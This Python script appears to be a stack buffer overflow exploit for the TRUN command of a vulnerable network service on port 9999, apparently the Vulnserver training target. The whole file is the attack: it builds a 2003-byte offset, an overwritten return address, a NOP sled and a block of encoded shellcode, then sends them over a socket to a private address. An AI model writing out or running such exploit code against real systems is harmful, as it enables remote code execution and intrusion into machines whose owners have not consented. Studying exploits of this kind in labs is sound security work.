import time, struct, sys
import socket

server = "192.168.1.11"
port = 9999
OFFSET = "A" * 2003
EIP = "\xaf\x11\x50\x62"
shellcode =  b""
shellcode += b"\xd9\xf6\xba\x2e\x84\xf2\x41\xd9\x74\x24\xf4"
shellcode += b"\x5d\x33\xc9\xb1\x52\x31\x55\x17\x83\xc5\x04"
shellcode += b"\x03\x7b\x97\x10\xb4\x7f\x7f\x56\x37\x7f\x80"
shellcode += b"\x37\xb1\x9a\xb1\x77\xa5\xef\xe2\x47\xad\xbd"
shellcode += b"\x0e\x23\xe3\x55\x84\x41\x2c\x5a\x2d\xef\x0a"
shellcode += b"\x55\xae\x5c\x6e\xf4\x2c\x9f\xa3\xd6\x0d\x50"
shellcode += b"\xb6\x17\x49\x8d\x3b\x45\x02\xd9\xee\x79\x27"
shellcode += b"\x97\x32\xf2\x7b\x39\x33\xe7\xcc\x38\x12\xb6"
shellcode += b"\x47\x63\xb4\x39\x8b\x1f\xfd\x21\xc8\x1a\xb7"
shellcode += b"\xda\x3a\xd0\x46\x0a\x73\x19\xe4\x73\xbb\xe8"
shellcode += b"\xf4\xb4\x7c\x13\x83\xcc\x7e\xae\x94\x0b\xfc"
shellcode += b"\x74\x10\x8f\xa6\xff\x82\x6b\x56\xd3\x55\xf8"
shellcode += b"\x54\x98\x12\xa6\x78\x1f\xf6\xdd\x85\x94\xf9"
shellcode += b"\x31\x0c\xee\xdd\x95\x54\xb4\x7c\x8c\x30\x1b"
shellcode += b"\x80\xce\x9a\xc4\x24\x85\x37\x10\x55\xc4\x5f"
shellcode += b"\xd5\x54\xf6\x9f\x71\xee\x85\xad\xde\x44\x01"
shellcode += b"\x9e\x97\x42\xd6\xe1\x8d\x33\x48\x1c\x2e\x44"
shellcode += b"\x41\xdb\x7a\x14\xf9\xca\x02\xff\xf9\xf3\xd6"
shellcode += b"\x50\xa9\x5b\x89\x10\x19\x1c\x79\xf9\x73\x93"
shellcode += b"\xa6\x19\x7c\x79\xcf\xb0\x87\xea\x30\xec\x86"
shellcode += b"\xe4\xd8\xef\x88\xe7\x88\x79\x6e\x7d\xb9\x2f"
shellcode += b"\x39\xea\x20\x6a\xb1\x8b\xad\xa0\xbc\x8c\x26"
shellcode += b"\x47\x41\x42\xcf\x22\x51\x33\x3f\x79\x0b\x92"
shellcode += b"\x40\x57\x23\x78\xd2\x3c\xb3\xf7\xcf\xea\xe4"
shellcode += b"\x50\x21\xe3\x60\x4d\x18\x5d\x96\x8c\xfc\xa6"
shellcode += b"\x12\x4b\x3d\x28\x9b\x1e\x79\x0e\x8b\xe6\x82"
shellcode += b"\x0a\xff\xb6\xd4\xc4\xa9\x70\x8f\xa6\x03\x2b"
shellcode += b"\x7c\x61\xc3\xaa\x4e\xb2\x95\xb2\x9a\x44\x79"
shellcode += b"\x02\x73\x11\x86\xab\x13\x95\xff\xd1\x83\x5a"
shellcode += b"\x2a\x52\xb3\x10\x76\xf3\x5c\xfd\xe3\x41\x01"
shellcode += b"\xfe\xde\x86\x3c\x7d\xea\x76\xbb\x9d\x9f\x73"
shellcode += b"\x87\x19\x4c\x0e\x98\xcf\x72\xbd\x99\xc5"

req = "TRUN /.:/" + OFFSET + EIP + "\x90"*10 + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
print(s.recv(1024))
s.send(req)
